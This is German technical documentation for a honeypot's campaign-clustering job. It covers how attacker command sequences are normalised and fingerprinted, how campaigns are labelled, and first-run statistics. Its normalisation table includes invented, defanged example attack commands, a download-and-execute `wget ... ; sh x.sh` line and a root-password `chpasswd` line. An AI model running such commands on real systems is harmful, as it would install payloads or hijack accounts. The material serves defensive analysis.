# Kampagnen

Eine Kampagne ist eine Gruppe von Sitzungen, die dieselbe Folge von Befehlen
schicken. Dahinter steckt fast immer dasselbe Werkzeug: ein Bot, ein Skript,
ein Dropper. Der Worker-Job `campaigns` bildet die Kampagnen stündlich neu
(Schritt 6.2, E-039). Code: `server/app/campaigns.py` (Normalisierung,
Fingerprint, Labels) und `build_campaigns` in `server/worker/jobs.py`.

## Fingerprint

1. Alle Befehle einer Sitzung, in ihrer Reihenfolge, werden **normalisiert**
   (nächster Abschnitt).
2. Leere Befehle fallen weg, direkt aufeinanderfolgende gleiche Befehle
   zählen einmal. Aus `uname -a`, `uname -a`, `id` wird `uname -a`, `id`.
3. Fingerprint = SHA-256 über die **Art der Sitzung** und die Folge, eine
   Zeile je Eintrag: `exec` oder `interactive`, dann die Befehle. Die Art
   kommt aus `sessions.interactive` (Pseudoterminal angefordert oder nicht).
4. Sitzungen ohne Befehl haben keinen Fingerprint und keine Kampagne.
5. Erst ab **5 Sitzungen** mit gleichem Fingerprint (`MIN_SESSIONS`) entsteht
   eine Kampagne. Alle anderen Sitzungen behalten `campaign_id = NULL`.

Der Job baut jedes Mal alles neu auf. Eine Kampagne bleibt über die Läufe
dieselbe Zeile, solange es ihren Fingerprint gibt; verschwindet er, wird sie
gelöscht, und ihre Sitzungen verlieren die Zuordnung.

## Normalisierung

Bots setzen Zufallswerte in ihre Befehle ein. Die Normalisierung ersetzt
diese Teile durch Platzhalter, damit gleiche Werkzeuge gleich aussehen.
Grundlage ist der gespeicherte Befehl, also schon ohne Adresse der
Beteiligten und entschärft (`hxxp://`, `[.]`). In dieser Reihenfolge:

| Schritt | Was                                                        | Beispiel (erfunden)                                  | Ergebnis                         |
|---------|------------------------------------------------------------|------------------------------------------------------|----------------------------------|
| 1 | SSH-Public-Keys: Typ bleibt, Body wird zu den ersten 12 Hex seines SHA-256 | `ssh-ed25519 AAAAC3Nz… kommentar`     | `ssh-ed25519 <KEY:3f9a0c1d2e4b> kommentar` |
| 2 | Leerraum vereinheitlichen                                  | `uname   -a;\twhoami`                                | `uname -a; whoami`               |
| 3 | entschärfte URLs                                           | `wget hxxp://198[.]51[.]100[.]7/x.sh; sh x.sh`       | `wget <URL>; sh x.sh`            |
| 4 | entschärfte IPv4-Adressen                                  | `ping 203[.]0[.]113[.]9`                             | `ping <IP>`                      |
| 5 | Passwort in `user:pw`-Form                                 | `echo "root:Xy7aB2kLmQ"\|chpasswd`                   | `echo "root:<PW>"\|chpasswd`     |
| 6 | Hex ab 16 Zeichen                                          | `echo deadbeefcafebabe0123`                          | `echo <HEX>`                     |
| 7 | Token ab 8 Zeichen aus Buchstaben **und** Ziffern          | `cd /tmp/.k2j4h5g6`                                  | `cd /tmp/.<TOKEN>`               |
| 8 | freistehende Zahlen                                        | `sleep 5; kill -9 1234`                              | `sleep <N>; kill -<N> <N>`       |

- **SSH-Schlüssel bleiben unterscheidbar.** Wer seinen eigenen Schlüssel
  hinterlegt, ist ein bestimmter Angreifer. Zwei verschiedene Schlüssel
  ergeben zwei verschiedene Kampagnen, derselbe Schlüssel wird wiedererkannt.
  Die übrigen Schritte laufen nicht über den Platzhalter.
- **Ziffern in Wörtern bleiben:** `python3`, `x86_64`, `/dev/sda1`.
- **Nichts wird zurückgebaut.** Die Normalisierung ersetzt nur durch
  Platzhalter, aus `[.]` oder `hxxp` wird nie wieder eine echte Adresse.
- **Kein ReDoS.** Eingabe höchstens 8192 Zeichen, in Wiederholungen nur
  Zeichenklassen, possessive Quantoren, Treffer nur an Wortgrenzen. Die Tests
  prüfen jedes Muster mit derselben Strukturprüfung wie die ATT&CK-Regeln
  (E-037) und feindliche Eingaben gegen eine Zeitgrenze.

## Grenzen

- **Verschiedene Download-Adressen ergeben dieselbe Kampagne.** Jede URL wird
  zu `<URL>`, jede Adresse zu `<IP>`. Dropper mit unterschiedlicher
  Infrastruktur, aber gleichem Ablauf landen damit in einer Kampagne. Das ist
  gewollt: Eine Kampagne ist ein Werkzeug, nicht ein Server.
- **Zufallswerte, die keine Regel trifft, trennen Kampagnen.** Etwa Passwörter
  ohne `user:` davor (`echo -e "pw\npw" | passwd`), Token nur aus Buchstaben
  oder mit Sonderzeichen. Der Bericht zeigt solche Fälle als viele kleine
  Kampagnen mit gleichem `p3`.
- **Einige feste Wörter werden zu `<TOKEN>`**, etwa `sha256sum` oder
  `mips64el`, und `chown root:root` wird zu `chown root:<PW>`. Das schadet
  nicht, weil es bei jeder Sitzung gleich passiert, macht den Bericht aber
  etwas schwerer zu lesen.
- **Bots, die auf Ausgaben reagieren, können sich über die Varianten
  aufteilen.** Der Fingerprint nimmt die ganze Folge. Antworten die klassische
  und die KI-Shell verschieden, und der Bot verzweigt danach, landen A- und
  B-Sitzungen desselben Bots in getrennten Kampagnen. Dann ist
  `sessions_a`/`sessions_b` einer Kampagne kein fairer Vergleich. Erkennbar
  im Bericht: mehrere Kampagnen mit gleichem `p3`, eine fast nur A, die
  andere fast nur B. Ein Fingerprint über nur die ersten N Befehle wäre
  dagegen robuster, ist aber bewusst nicht eingebaut (E-039).
- **Laufende Sitzungen** haben noch nicht alle Befehle. Der nächste Lauf
  ordnet sie neu zu.

## Kennzahlen je Kampagne

| Feld                      | Bedeutung                                                     |
|---------------------------|---------------------------------------------------------------|
| `kind`                    | `exec` oder `interactive`                                     |
| `sessions_a`, `sessions_b`| Sitzungen je Variante                                         |
| `countries`               | Sitzungen je Land, `??` ohne Land                             |
| `techniques`              | Vereinigung der ATT&CK-Techniken aller Befehle (E-037)        |
| `first_seen`, `last_seen` | erster und letzter Sitzungsstart                              |
| `sources`                 | Anzahl verschiedener `ip_hash`                                |
| `asns`                    | Anzahl verschiedener ASNs                                     |
| `median_interval_s`       | Median der Abstände zwischen aufeinanderfolgenden Starts, Sekunden |

`ip_hash` selbst gibt keine Ausgabe aus, auch nicht der Bericht.

## Ein Label vergeben

`/stats/campaigns` zeigt nur Kampagnen mit Label. Ungeprüfte Kampagnen
bleiben intern. Label und Beschreibung stehen nur in
`server/rules/campaigns.yml`; der Job überschreibt bei jedem Lauf, was in der
Datenbank steht. Nie von Hand per SQL setzen.

1. Auf dem Hauptserver im eigenen Terminal den Bericht holen
   (`server/README.md`, „Kampagnen“):
   `python -m worker.main run campaigns --bericht`.
2. Die Kampagne ansehen: Präfix (erste 12 Zeichen des Fingerprints), Art,
   Sitzungen, Quellen, Abstand und die ersten drei Befehle. Befehle nicht
   ausführen und nicht ungeprüft in einen Coding-Agenten kopieren.
3. In `server/rules/campaigns.yml` einen Eintrag ergänzen:

   ```yaml
   campaigns:
     - prefix: "0123456789ab"
       label: "Kurzer Name"
       description: >-
         Was die Kampagne tut, in ein, zwei Sätzen.
   ```

   Präfix aus 12 kleinen Hex-Zeichen, Label höchstens 64 Zeichen,
   Beschreibung höchstens 1000. Präfix und Label müssen eindeutig sein, das
   Frontend nutzt das Label als Schlüssel. Beides ist öffentlich: keine
   Adressen, keine Befehle im Klartext, keine echten Firmen-, Personen- oder
   Markennamen.
4. Die Tabelle unten ergänzen, PR, Merge, Deploy (rsync, `build`, `up -d`).
5. `run campaigns` einmal von Hand, oder auf den nächsten stündlichen Lauf
   warten. `labels_ohne_kampagne` im Log nennt Präfixe, die keine Kampagne
   (mehr) treffen.

Eine kaputte Datei (falscher Präfix, doppeltes Label, zu lang) lässt den Job
scheitern, bevor er etwas schreibt. Die Tests prüfen die Datei im Repo.

## Gelabelte Kampagnen

| Präfix | Label | Art | Beschreibung | seit |
|--------|-------|-----|--------------|------|
| `611080a1c75e` | System-Abfrage (ausführlich) | exec | Fragt mit einem Befehl detaillierte Systeminformationen (Kernel, Hostname, Architektur) ab. Fällt durch eine extrem hohe Anzahl an Sitzungen von wenigen Quellen auf. | 30.09.2026 |
| `37fa39ae478f` | SSH-Key-Persistenz, breit verteilt | exec | Legt einen SSH-Schlüssel ab und entzieht Schreibrechte auf das Verzeichnis, um die eigene Persistenz abzusichern. Wird von vielen unterschiedlichen Quellen genutzt und ähnelt dem Verhalten bekannter Botnets. | 30.09.2026 |
| `8c3baa7a58ac` | SSH-Key-Persistenz mit Systemanalyse | exec | Teilt sich die Startbefehle mit der breit verteilten Kampagne zur SSH-Persistenz, führt danach aber noch weitere Befehle aus, um unter anderem CPU-Details zu ermitteln (oft eine Vorbereitung für Krypto-Mining). | 30.09.2026 |
| `7b935cc643ca` | System-Abfrage mit manipuliertem PATH | exec | Setzt gezielt die PATH-Variable der Shell neu und versucht über verschiedene direkte Pfade verlässlich die Architektur des Systems zu bestimmen. | 30.09.2026 |
| `72091e609000` | System-Abfrage (absoluter Pfad) | exec | Nutzt den absoluten Pfad zum Binärprogramm für die Abfrage von Systeminformationen. Dies dient oft dazu, einfache Verschleierungen durch Aliase auf dem Zielsystem zu umgehen. | 30.09.2026 |
| `02db2dbb7023` | Dropper-Routine (Setup & Clean) | exec | Führt Skripte aus, um das System zu bereinigen und für weitere Aktionen vorzubereiten. Legt am Ende einen SSH-Schlüssel ab. Dieses Vorgehen ähnelt bekannten Dropper-Familien wie Outlaw. | 30.09.2026 |
| `11719f310a95` | System-Abfrage mit Echo-Marker | exec | Fragt das System ab und gibt direkt danach eine festgelegte Zeichenfolge per Echo aus. Ein solches Vorgehen dient Automatismen meist dazu zu prüfen, ob die Kommandozeile reagiert. | 30.09.2026 |

## Erster Lauf (30.09.2026, nur Variante A)

Zusammenfassung aus Worker-Log und `run campaigns --bericht`, ohne Befehle im
Klartext. Zahlen sind eine Momentaufnahme; aktuelle Werte liefert
`/stats/campaigns`.

- 20.358 Sitzungen mit Befehlen, nur 64 verschiedene Befehlsfolgen,
  27 Kampagnen. 20.307 Sitzungen (99,7 %) gehören zu einer Kampagne. Fast alle
  Befehle kommen von Automatik.
- **Ein Werkzeug stellt 72 % der Sitzungen:** `611080a1c75e` mit 14.567
  Sitzungen von 43 Quellen in 11 ASNs, im Median alle 9 Sekunden. Wenige
  Quellen, die hämmern, kein breites Botnetz. Jede Gesamtkennzahl ohne
  Aufteilung nach Kampagne wird von ihm bestimmt.
- **Breit verteilt:** `37fa39ae478f` (SSH-Key-Persistenz) mit 3.219 Sitzungen
  von 570 Quellen in 281 ASNs, im Mittel etwa 6 Sitzungen je Quelle.
  `8c3baa7a58ac` beginnt mit denselben zwei Befehlen und führt danach 16
  weitere aus (78 Sitzungen, 59 Quellen). Dieselbe Familie tritt also schon
  in Variante A in zwei Längen auf, obwohl die Shell immer gleich antwortet.
- **Einzelbefehl-Werkzeug:** Rund elf Kampagnen bestehen aus genau einem
  Erkundungsbefehl (Hostname, Benutzer, Verzeichnis, SSH-Version,
  Verzeichnisinhalt, Netzwerk, Umgebung, Historie, Laufzeit, Mounts,
  Prozesse), je 57–205 Sitzungen von 3–5 Quellen, Abstand 30–120 Minuten.
  Vermutlich ein Werkzeug, das für jeden Befehl eine eigene Sitzung öffnet;
  der Fingerprint über die Befehlsfolge zerlegt es. Noch nicht belegt: Dafür
  fehlt im Bericht die Überlappung der Quellen. Diese Kampagnen haben
  bewusst noch kein Label, damit `/lab` nicht nur Einzelbefehle zeigt.
- **Grenze von `p3`:** Bei Folgen mit weniger als drei Befehlen hasht `p3`
  weniger Befehle. `37fa39ae478f` und `8c3baa7a58ac` haben deshalb
  verschiedene `p3`, obwohl die eine Folge der Anfang der anderen ist.

Folgen für `docs/method.md` (7.1): Befehle pro Sitzung taugt wegen des
Einzelbefehl-Werkzeugs nur eingeschränkt als Messgröße; A und B besser je
Kampagne bzw. Werkzeug vergleichen, und bei Familien mit mehreren Längen den
Anteil der langen Variante statt ihres bloßen Auftretens.
